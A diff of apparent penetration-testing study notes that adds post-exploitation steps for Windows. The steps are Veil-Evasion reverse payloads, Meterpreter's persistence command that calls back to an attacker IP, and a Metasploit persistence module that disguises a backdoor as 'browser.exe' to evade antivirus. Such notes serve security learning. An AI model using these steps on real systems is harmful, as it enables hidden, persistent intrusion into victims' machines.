@@ -72,7 +72,26 @@ to have a connection on port 80 or 8080.
 - upload [file name]
 - execute -f [file.exe]
 - shell: Get a Windows prompt or Windows command line
+- background
 
+Post Explotation:
+- Using a veil-evasion
+	- Rev_http_service
+	- Rev_tcp_service
+	- Use it instead of a normal backdoor.
+	- Or upload and execute from meterpreter
+	- Does not always work
+- Meterpreter: This metod is detectable by antivirus
+	- run persistence  -U -i 20 -p [port] -r [ip]
+		- run persistence -h
+- Using metasploit + veil-evasion → More robust + undetectable by Antivirus		 
+	- use exploit/windows/local/persistence
+	- show options
+		- set EXE_NAME browser.exe
+		- set SESSION 1: You need to specify which session to run this exploit on. Where is your Meterpreter runing.
+	- show advanced
+		- set EXE::Custom /path/to/veil/backdor
+	- exploit
 
 ## Beef
 To Hook:
